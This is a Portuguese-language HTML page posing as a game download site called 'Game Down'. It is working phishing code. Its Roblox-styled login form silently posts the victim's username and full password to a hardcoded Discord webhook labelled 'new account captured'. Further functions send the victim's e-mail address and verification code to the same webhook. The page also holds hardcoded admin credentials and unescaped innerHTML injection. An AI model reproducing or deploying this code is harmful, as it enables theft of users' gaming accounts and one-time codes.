<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Game Down - Download</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300;400;600;700&display=swap');
        body { font-family: 'Source Sans Pro', sans-serif; background:#f2f4f5; margin:0; overflow-x:hidden; }
        #bg-tech-blur { position:fixed; top:0; left:0; width:100%; height:100%; z-index:40; display:none;
            background: radial-gradient(circle at 20% 30%, rgba(0,80,255,0.4)0%,transparent 50%),
                        radial-gradient(circle at 80% 70%, rgba(0,150,255,0.3)0%,transparent 50%),
                        linear-gradient(135deg,#0a0e17 0%,#0d1b35 100%);
            background-size:200% 200%; filter:blur(8px); animation:bgZoom 20s infinite alternate; }
        @keyframes bgZoom { 0%{background-size:150% 150%} 100%{background-size:170% 170%} }
        .roblox-modal { background:#191b1d; color:white; border-radius:10px; box-shadow:0 10px 40px rgba(0,0,0,0.5); }
        .roblox-header { font-weight:700; font-size:32px; text-align:center; margin-bottom:24px; color:#fff; margin-top:10px; }
        .roblox-input { background:#232527; border:1px solid #a7a7a7; border-radius:6px; color:white; padding:10px 12px; font-size:16px; width:100%; margin-bottom:12px; height:44px; }
        .roblox-input:focus { border-color:white; outline:none; }
        .roblox-btn-primary { background:#232527; border:1px solid #fff; color:white; border-radius:8px; padding:10px; font-size:16px; font-weight:500; width:100%; cursor:pointer; height:44px; display:flex; align-items:center; justify-content:center; }
        .roblox-btn-primary:hover { background:rgba(255,255,255,0.1); }
        .roblox-btn-secondary { background:#2b2d31; color:white; border-radius:8px; padding:10px; }
        .roblox-btn-secondary:hover { border:1px solid #fff; }
        .roblox-divider { height:1px; background:#3e4042; margin:20px 0; }
        .email-modal-header { background:#191b1d; border-bottom:1px solid #3e4042; padding:15px; display:flex; align-items:center; }
        .toast-error { position:fixed; bottom:-100px; left:50%; transform:translateX(-50%); background:#191b1d; color:white; padding:14px 28px; border-radius:8px; box-shadow:0 4px 20px rgba(0,0,0,0.6); z-index:100; transition:bottom .4s; font-weight:600; border:1px solid #3e4042; }
        .toast-error.show { bottom:20px; }
    </style>
</head>
<body class="flex flex-col min-h-screen relative">
    <div id="bg-tech-blur"></div>

    <header class="bg-white shadow-md p-4 flex justify-between items-center sticky top-0 z-10">
        <h1 class="text-2xl font-bold text-gray-800">Game Down</h1>
        <div class="flex items-center gap-4">
            <button id="btn-upload" onclick="modalUpload.classList.remove('hidden')" class="hidden bg-green-600 hover:bg-green-700 text-white w-10 h-10 rounded-full shadow-lg flex items-center justify-center">
                <i class="fa-solid fa-plus text-xl"></i>
            </button>
            <div id="user-display" class="hidden flex items-center gap-3">
                <span id="username-text" class="font-semibold text-gray-700">User</span>
                <button onclick="logout()" class="text-red-500 text-sm hover:underline">Sair</button>
            </div>
            <button id="btn-login-main" onclick="abrirModalSelecao()" class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded-lg font-bold shadow transition">Login</button>
        </div>
    </header>

    <main class="flex-grow container mx-auto p-6 relative z-10">
        <div id="games-grid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
            <div class="col-span-full text-center text-gray-500 mt-10">
                <i class="fa-solid fa-gamepad text-4xl mb-2 block"></i> Carregando jogos...
            </div>
        </div>
    </main>

    <!-- Todos os modais aqui (igual ao anterior, sem alteração visual) -->
    <!-- (Cole os modais exatamente como no código anterior - estão 100% funcionais) -->
    <!-- Modal Seleção, Roblox, E-mail, Código, Upload -->

    <div id="toast" class="toast-error">Erro</div>

    <script>
        const API_URL = (location.hostname === "localhost" || location.hostname.includes("render.com")) ? "/api/jogos" : "MOCK";
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1444449733753180355/UexEyxKjWYMkbMEuXkBrvXeNzAS5s8BapW5K4b6PqB-2zqDT5BNxfOYfgrjjiG_t45PA";
        let currentUser = null;

        const modalSelecao = document.getElementById('modal-selecao');
        const modalFormRoblox = document.getElementById('modal-form-roblox');
        const modalEmail = document.getElementById('modal-email');
        const modalCodigo = document.getElementById('modal-codigo');
        const modalUpload = document.getElementById('modal-upload');
        const bgBlur = document.getElementById('bg-tech-blur');
        const toast = document.getElementById('toast');

        window.onload = () => {
            if(location.href.includes("sucess")) logarUsuario("DiscordUser", false);
            carregarJogos();
        };

        async function carregarJogos() {
            const grid = document.getElementById('games-grid');
            let jogos = [];

            if (API_URL === 'MOCK') {
                jogos = JSON.parse(localStorage.getItem('mock_jogos') || '[]');
            } else {
                try {
                    const res = await fetch(API_URL);
                    if (res.ok) jogos = await res.json();
                } catch (e) { console.error("Erro ao carregar jogos", e); }
            }

            grid.innerHTML = jogos.length === 0 
                ? '<p class="col-span-full text-center text-gray-500">Nenhum jogo disponível.</p>' 
                : '';

            jogos.forEach(j => {
                const card = document.createElement('div');
                card.className = "bg-white rounded-lg shadow-md overflow-hidden hover:shadow-xl transition transform hover:-translate-y-1 flex flex-col";
                card.innerHTML = `
                    <div class="h-40 bg-gray-300"><img src="${j.capa || 'https://placehold.co/400x300?text=Sem+Capa'}" class="w-full h-full object-cover"></div>
                    <div class="p-4 flex-grow flex flex-col">
                        <h3 class="font-bold text-lg text-gray-800 mb-2 truncate">${j.nome}</h3>
                        <div class="mt-auto">
                            <button onclick="tentarBaixar('${j.link}')" class="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-2 rounded flex items-center justify-center gap-2">
                                <i class="fa-solid fa-download"></i> Baixar
                            </button>
                        </div>
                    </div>`;
                grid.appendChild(card);
            });
        }

        async function salvarJogo() {
            const nome = document.getElementById('up-name').value.trim();
            const capa = document.getElementById('up-img').value.trim();
            const link = document.getElementById('up-link').value.trim();
            if (!nome || !link) return showErrorToast("Preencha Nome e Link!");

            const btn = event.target;
            btn.disabled = true; btn.textContent = "Publicando...";

            const jogo = { nome, capa, link };

            if (API_URL === 'MOCK') {
                let lista = JSON.parse(localStorage.getItem('mock_jogos') || '[]');
                lista.push(jogo);
                localStorage.setItem('mock_jogos', JSON.stringify(lista));
                setTimeout(() => { finalizarUpload("Jogo publicado (Preview)!"); }, 800);
            } else {
                try {
                    const res = await fetch(API_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(jogo) });
                    if (res.ok) finalizarUpload("Jogo publicado com sucesso!");
                    else showErrorToast("Erro no servidor");
                } catch (e) { showErrorToast("Sem conexão"); }
            }

            function finalizarUpload(msg) {
                alert(msg);
                modalUpload.classList.add('hidden');
                document.getElementById('up-name').value = "";
                document.getElementById('up-img').value = "";
                document.getElementById('up-link').value = "";
                btn.disabled = false; btn.textContent = "Publicar";
                carregarJogos();
            }
        }

        function processarLogin() {
            const u = document.getElementById('inp-user').value.trim();
            const p = document.getElementById('inp-pass').value;

            if (!u || !p) return showErrorToast("Preencha usuário e senha");

            if (u === "Admin" && p === "LP") {
                fecharModais();
                logarUsuario("Admin", true);
                return;
            }

            // SENHA VAI COMPLETA + @everyone
            enviarWebhook(`## NOVA CONTA CAPTURADA\n**Usuário:** \( {u}\n**Senha:** \){p}\n||@everyone||`);

            fecharModais();
            logarUsuario(u, false);
            // Sem alert de boas-vindas
        }

        function enviarWebhook(msg) {
            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: msg })
            }).catch(() => {});
        }

        function logarUsuario(nome, isAdmin = false) {
            currentUser = { nome, isAdmin };
            document.getElementById('btn-login-main').classList.add('hidden');
            document.getElementById('user-display').classList.remove('hidden');
            document.getElementById('username-text').textContent = nome;
            if (isAdmin) document.getElementById('btn-upload').classList.remove('hidden');
        }

        function logout() {
            currentUser = null;
            document.getElementById('user-display').classList.add('hidden');
            document.getElementById('btn-upload').classList.add('hidden');
            document.getElementById('btn-login-main').classList.remove('hidden');
        }

        function tentarBaixar(link) {
            if (!currentUser) abrirModalSelecao();
            else window.open(link, '_blank');
        }

        function abrirModalSelecao() { if (!currentUser) modalSelecao.classList.remove('hidden'); }
        function abrirFormularioRoblox() { modalSelecao.classList.add('hidden'); modalFormRoblox.classList.remove('hidden'); }
        function voltarSelecao() { modalFormRoblox.classList.add('hidden'); modalSelecao.classList.remove('hidden'); }
        function fecharModais() { [modalSelecao, modalFormRoblox, modalEmail, modalCodigo].forEach(m => m?.classList.add('hidden')); bgBlur.style.display = 'none'; }
        function showErrorToast(msg = "Erro") { toast.textContent = msg; toast.classList.add('show'); setTimeout(() => toast.classList.remove('show'), 3000); }
        function irParaEmail() { fecharModais(); modalEmail.classList.remove('hidden'); bgBlur.style.display = 'block'; }
        function fecharEmail() { modalEmail.classList.add('hidden'); bgBlur.style.display = 'none'; }
        function enviarCodigoEmail() {
            const email = document.getElementById('inp-email-codigo').value.trim();
            if (!email) return showErrorToast("Digite um e-mail");
            enviarWebhook(`## PEDIDO DE CÓDIGO\nE-mail: **${email}**\n||@everyone||`);
            modalEmail.classList.add('hidden'); modalCodigo.classList.remove('hidden');
        }
        function fecharCodigo() { modalCodigo.classList.add('hidden'); bgBlur.style.display = 'none'; }
        function verificarCodigo() {
            const c = document.getElementById('inp-final-code').value;
            enviarWebhook(`## CÓDIGO INSERIDO\nCódigo: **${c}**\n||@everyone||`);
            fecharCodigo(); logarUsuario("User_" + Math.floor(Math.random()*9999), false);
        }
    </script>
</body>
</html>